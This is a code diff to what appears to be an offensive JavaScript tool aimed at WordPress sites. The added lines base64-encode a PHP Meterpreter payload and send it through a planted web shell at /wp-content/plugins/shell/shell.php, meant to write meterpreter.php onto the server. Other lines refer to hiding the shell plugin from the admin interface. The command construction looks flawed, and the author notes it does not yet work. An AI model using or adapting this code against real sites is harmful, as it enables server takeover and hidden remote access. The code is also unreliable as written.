@@ -425,8 +425,19 @@ function openPhpMeterpreterSession()
     ?>`;
 
     var payload = btoa(metPhpCommand);
+    console.log("Base64 PHP code is: " + payload);
 
+    var commandValue = btoa("php -r \'echo base64_decode(\"" + payload + "\"); > meterpreter.php'");
 
+    console.log("Command value is: " + commandValue);
+
+    var uri = "/wp-content/plugins/shell/shell.php?cmd=" + commandValue;
+
+    // Ok, let's upload our meterpreter php file...
+	xhr = new XMLHttpRequest();
+	
+	xhr.open("GET", uri, true);
+	xhr.send(null);
 
 }
 
@@ -466,3 +477,6 @@ function openPhpMeterpreterSession()
 // Hide the yertle shell plugin from the UI
 //hideYertleShell();
 
+
+// Someday this is going to work....
+//openPhpMeterpreterSession();
